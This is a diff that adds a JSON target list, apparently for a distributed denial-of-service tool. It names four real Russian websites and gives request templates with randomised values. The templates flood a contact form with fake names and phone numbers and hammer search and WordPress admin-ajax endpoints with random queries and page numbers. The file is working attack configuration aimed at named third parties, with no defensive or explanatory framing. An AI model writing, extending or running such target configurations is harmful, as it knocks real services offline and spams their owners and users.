@@ -1,0 +1,38 @@
+{
+  "targets": [
+    {
+      "target": "https://modshairrussia.ru",
+      "method": "HTTP_TEMPLATE",
+      "options": {
+        "body": "-----------------------------17097944912524891368454341740\nContent-Disposition: form-data; name=\"name\"\n\n{{str(6)}}\n-----------------------------17097944912524891368454341740\nContent-Disposition: form-data; name=\"phone\"\n\n+7 (495) 625-{{int(1,9)}}{{int(1,9)}}-{{int(1,9)}}{{int(1,9)}}\n-----------------------------17097944912524891368454341740\nContent-Disposition: form-data; name=\"subject\"\n\nTotal look\n-----------------------------17097944912524891368454341740--\n",
+        "headers": "{\"Content-Type\": \"multipart/form-data; boundary=---------------------------17097944912524891368454341740\", \"Referer\": \"https://modshairrussia.ru/\", \"X-Requested-With\": \"X-Requested-With\"}",
+        "path_qs": "/send",
+        "verb": "POST"
+      }
+    },
+    {
+      "target": "https://myzte.ru",
+      "method": "HTTP_TEMPLATE",
+      "options": {
+        "headers": "{\"Referer\": \"https://myzte.ru/\"}",
+        "path_qs": "/search-result/?q=zte&PAGEN_1={{int(1,50)}}"
+      }
+    },
+    {
+      "target": "https://novorosinform.org",
+      "method": "HTTP_TEMPLATE",
+      "options": {
+        "headers": "{\"Referer\": \"https://novorosinform.org/\"}",
+        "path_qs": "/search?q={{str(1)}}&section=all"
+      }
+    },
+    {
+      "target": "https://pandoraopen.ru",
+      "method": "HTTP_TEMPLATE",
+      "options": {
+        "headers": "{\"Referer\": \"https://pandoraopen.ru/?s=\"}",
+        "path_qs": "/wp-admin/admin-ajax.php?s={{str(1)}}&search_sortby=&q=&page={{int(1,100)}}&uid=0&action=load_posts&w=1723"
+      }
+    }
+  ]
+}
